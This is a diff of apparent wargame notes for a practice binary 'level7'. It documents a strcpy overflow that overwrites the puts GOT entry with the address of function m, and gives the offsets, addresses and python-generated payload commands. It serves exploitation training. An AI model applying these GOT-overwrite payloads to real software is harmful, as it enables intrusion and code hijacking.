@@ -1,26 +1,33 @@
-- attack: buffer overflow
+- attack: buffer overflow using GOT + format string exploitation
 - binary behavior: segfault without or with 1 parameter, ~~ with 2 parameters
 - targeted functions: m and main
-- vulnerability in m: strcpy() in comparison strncpy() has no limitimg argument
-- defense: function n with system call is non-called
+- vulnerability in m: strcpy() in comparison to strncpy() has no limitimg argument
+- defense: 
 
-Method: send  link to fopens (after sedons strcpy) to the function with printf
-- find the overflow offset for second strcpy
-- find eip offest address after overflowing strcpy
+Method: send address of fopens (after secdons strcpy) to the function m with printf
+- find the overflow offset for first strcpy
+- check it - correct offset will put paypload into second strcpy after overflowing
+
+- find the address of 'puts' function in GOT
 - find the address of m function
-- overflow and change eip address by m address
+
+- write in GOT 'm' address instead of 'puts' address 
 - enter to the m function
+- 'm' will execute printf with varibale pass
+
 
 Info:
 - offset size - 20
-- 0x8049928 - address of jmp in puts
+- 8049928 - address of puts in GOT
 - same in hex - \x28\x99\x04\x08
+
 - 080484f4 - address of m function
 - same in hex - \xf4\x84\x04\x08
 
 Code:
 objdump -d ./level7
-ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa
+ltrace ./level7 a b
+ltrace ./level7 a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 ltrace ./level7 $(python -c 'print "b" * 20 + "\x28\x99\x04\x08"') 
 ./level7 $(python -c 'print "b" * 19 + "\x28\x99\x04\x08"')  $(python -c 'print "\xf4\x84\x04\x08"')
 ./level7 $(python -c 'print "b" * 20 + "\x28\x99\x04\x08"')  $(python -c 'print "\xf4\x84\x04\x08"')
